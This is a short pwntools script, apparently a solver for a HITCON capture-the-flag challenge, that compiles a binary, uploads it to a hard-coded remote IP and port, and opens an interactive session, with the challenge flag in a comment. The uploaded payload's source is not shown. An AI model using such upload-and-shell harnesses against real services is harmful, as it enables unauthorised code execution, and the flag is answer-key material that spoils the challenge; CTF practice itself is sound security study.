#!/usr/bin/env python3
from pwn import *


def main():
    subprocess.check_call(['make', 'pwnit'])
    with open('pwnit', 'rb') as fp:
        pwnit = fp.read()
    with remote('3.115.58.219', 9427) as tube:
        tube.recvuntil(b'ELF size? (MAX: 6144)\n')
        tube.sendline(str(len(pwnit)))
        tube.send(pwnit)
        tube.interactive()  # hitcon{use_pwntools_to_pwn_pwntools_^ovo^}


if __name__ == '__main__':
    main()
